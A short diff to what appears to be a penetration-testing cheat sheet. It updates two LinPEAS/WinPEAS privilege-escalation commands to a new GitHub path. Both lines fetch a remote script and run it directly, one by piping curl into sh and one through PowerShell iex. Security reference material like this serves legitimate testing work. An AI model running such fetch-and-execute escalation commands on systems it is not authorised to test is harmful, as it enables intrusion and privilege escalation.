@@ -1864,10 +1864,10 @@ sudo wifite --kill
 **LinPEAS / WinPEAS**:
 ```bash
 # Linux privilege escalation enumeration
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # Windows (PowerShell)
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
 ```
 
 **PowerSploit / PowerUp**:
